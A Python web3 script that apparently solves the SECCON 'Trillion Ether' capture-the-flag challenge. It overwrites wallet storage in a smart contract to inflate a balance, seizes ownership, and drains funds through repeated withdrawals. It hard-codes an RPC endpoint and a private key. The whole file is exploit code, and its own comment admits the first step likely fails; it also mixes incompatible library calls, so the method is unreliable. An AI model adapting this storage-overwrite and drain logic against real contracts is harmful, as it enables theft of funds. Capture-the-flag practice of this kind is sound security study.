from web3 import Web3
from eth_account import Account
import sys

# 接続情報を設定
rpc_endpoint = 'http://trillion-ether.seccon.games:8545/39aa3f0f-7798-4c05-ad91-0c6cd093487e'
private_key = '17c5d2b07938134a078f40a2a02ece476d66e269045fc1c38b73a889ab9170c7'
challenge_contract_address = '0x058DfA7793150C129b6f9cec4aFdfE3a10Ad9828'
target_wallet_address = '0x65ADbdcdb2D990197d2de5A804Ee3Ac538E61B09'

# コントラクトのABI（修正済み）
abi = [
    {
        "inputs": [],
        "stateMutability": "payable",
        "type": "constructor"
    },
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "bytes32",
                "name": "name",
                "type": "bytes32"
            }
        ],
        "name": "createWallet",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "uint256",
                "name": "fromWalletId",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "toWalletId",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "transfer",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "uint256",
                "name": "walletId",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "withdraw",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "wallets",
        "outputs": [
            {
                "components": [
                    {
                        "internalType": "bytes32",
                        "name": "name",
                        "type": "bytes32"
                    },
                    {
                        "internalType": "uint256",
                        "name": "balance",
                        "type": "uint256"
                    },
                    {
                        "internalType": "address",
                        "name": "owner",
                        "type": "address"
                    }
                ],
                "internalType": "struct TrillionEther.Wallet[]",
                "name": "",
                "type": "tuple[]"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    # 追加: wallets(uint256) 関数
    {
        "inputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "name": "wallets",
        "outputs": [
            {
                "internalType": "bytes32",
                "name": "name",
                "type": "bytes32"
            },
            {
                "internalType": "uint256",
                "name": "balance",
                "type": "uint256"
            },
            {
                "internalType": "address",
                "name": "owner",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
]

# Web3の初期化
w3 = Web3(Web3.HTTPProvider(rpc_endpoint))
if not w3.is_connected():
    print("Error: RPC endpointに接続できません。")
    sys.exit(1)

account = Account.from_key(private_key)
contract = w3.eth.contract(address=challenge_contract_address, abi=abi)

def find_wallet_id(target_address, max_index=1000):
    """
    指定されたアドレスに対応するwallet_idを見つける関数
    """
    for i in range(max_index):
        try:
            wallet = contract.functions.wallets(i).call()
            if wallet[2].lower() == target_address.lower():
                return i
        except Exception as e:
            # インデックスが範囲外の場合などにエラーが発生する可能性があるため
            continue
    return None

def exploit():
    try:
        # ステップ1: wallets.lengthを大きな値に設定
        print("Step 1: wallets.lengthを大きな値に設定します...")
        large_number = 2 ** 256 - 1  # 注意: Solidity 0.8.xではオーバーフローが検出されるため失敗する可能性が高い
        name = large_number.to_bytes(32, 'big')
        tx = contract.functions.createWallet(name).build_transaction({
            'from': account.address,
            'nonce': w3.eth.get_transaction_count(account.address),
            'gas': 500000,
            'gasPrice': Web3.toWei('1', 'gwei'),
            'value': 0  # Etherを送信しない
        })
        signed_tx = w3.eth.account.sign_transaction(tx, private_key=private_key)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        if receipt.status == 1:
            print("Step 1: wallets.lengthを上書きしました。")
        else:
            print("Step 1: wallets.lengthの上書きに失敗しました。")
            return

        # ステップ2: wallet_idを特定
        print("Step 2: ターゲットウォレットのwallet_idを特定します...")
        wallet_id = find_wallet_id(target_wallet_address)
        if wallet_id is not None:
            print(f"Found wallet_id: {wallet_id} for address: {target_wallet_address}")
        else:
            print(f"Wallet with address {target_wallet_address} not found.")
            return

        # ステップ3: ウォレットの詳細を確認
        print("Step 3: ウォレットの詳細を確認します...")
        wallet = contract.functions.wallets(wallet_id).call()
        print(f"Wallet[{wallet_id}]: Name={wallet[0].hex()}, Balance={wallet[1]}, Owner={wallet[2]}")

        # ステップ4.1: balance を上書き
        print("Step 4.1: wallets[wallet_id].balance を上書きします...")
        one_trillion_ether = 1_000_000_000_000 * (10 ** 18)  # 1兆 EtherをWeiに換算
        balance_override = one_trillion_ether.to_bytes(32, 'big')
        tx_balance = contract.functions.createWallet(balance_override).build_transaction({
            'from': account.address,
            'nonce': w3.eth.get_transaction_count(account.address),
            'gas': 500000,
            'gasPrice': Web3.toWei('1', 'gwei'),
            'value': 0  # Etherを送信しない
        })
        signed_tx_balance = w3.eth.account.sign_transaction(tx_balance, private_key=private_key)
        tx_hash_balance = w3.eth.send_raw_transaction(signed_tx_balance.raw_transaction)
        receipt_balance = w3.eth.wait_for_transaction_receipt(tx_hash_balance)
        if receipt_balance.status == 1:
            print("Step 4.1: wallets[wallet_id].balance を上書きしました。")
        else:
            print("Step 4.1: balance の上書きに失敗しました。")
            return

        # ステップ4.2: owner を上書き
        print("Step 4.2: wallets[wallet_id].owner を上書きします...")
        # 攻撃者のアドレスをbytes32に変換
        owner_override = account.address.lower().replace('0x', '').ljust(64, '0')  # 左詰めでパディング
        owner_override_bytes = bytes.fromhex(owner_override)
        tx_owner = contract.functions.createWallet(owner_override_bytes).build_transaction({
            'from': account.address,
            'nonce': w3.eth.get_transaction_count(account.address),
            'gas': 500000,
            'gasPrice': Web3.toWei('1', 'gwei'),
            'value': 0  # Etherを送信しない
        })
        signed_tx_owner = w3.eth.account.sign_transaction(tx_owner, private_key=private_key)
        tx_hash_owner = w3.eth.send_raw_transaction(signed_tx_owner.raw_transaction)
        receipt_owner = w3.eth.wait_for_transaction_receipt(tx_hash_owner)
        if receipt_owner.status == 1:
            print("Step 4.2: wallets[wallet_id].owner を上書きしました。")
        else:
            print("Step 4.2: owner の上書きに失敗しました。")
            return

        # ステップ5: ウォレットの詳細を再確認
        print("Step 5: ウォレットの詳細を再確認します...")
        wallet = contract.functions.wallets(wallet_id).call()
        print(f"Updated Wallet[{wallet_id}]: Name={wallet[0].hex()}, Balance={wallet[1]}, Owner={wallet[2]}")

        # ステップ6: withdrawを数回に分けて実行
        print("Step 6: withdrawを数回に分けて実行します...")
        number_of_withdrawals = 10  # 必要に応じて調整
        contract_balance = wallet[1]  # 更新されたウォレットのバランスを使用
        amount_to_withdraw = contract_balance // number_of_withdrawals
        total_withdrawn = 0

        current_nonce = w3.eth.get_transaction_count(account.address)

        for i in range(number_of_withdrawals):
            # 最後の引き出しでは残り全額を引き出す
            if i == number_of_withdrawals - 1:
                amount = contract_balance - total_withdrawn
            else:
                amount = amount_to_withdraw

            try:
                tx_withdraw = contract.functions.withdraw(wallet_id, amount).build_transaction({
                    'from': account.address,
                    'nonce': current_nonce,
                    'gas': 1000000,  # 必要に応じて調整
                    'gasPrice': Web3.toWei('1', 'gwei'),
                })
                signed_tx_withdraw = w3.eth.account.sign_transaction(tx_withdraw, private_key=private_key)
                tx_hash_withdraw = w3.eth.send_raw_transaction(signed_tx_withdraw.raw_transaction)
                receipt_withdraw = w3.eth.wait_for_transaction_receipt(tx_hash_withdraw)

                if receipt_withdraw.status == 1:
                    print(f"Step 6.{i+1}: {amount} weiを引き出しました。")
                    total_withdrawn += amount
                    current_nonce += 1
                else:
                    print(f"Step 6.{i+1}: withdrawに失敗しました。")
                    break
            except Exception as e:
                print(f"Step 6.{i+1}: エラーが発生しました - {str(e)}")
                break
    except Exception as e:
        print(f"エラーが発生しました - {str(e)}")

    # ステップ7: isSolved() を確認
    print("Step 7: isSolved() を確認します...")
    solved = contract.functions.isSolved().call()
    print(f"Step 7: isSolved() = {solved}")

if __name__ == '__main__':
    exploit()

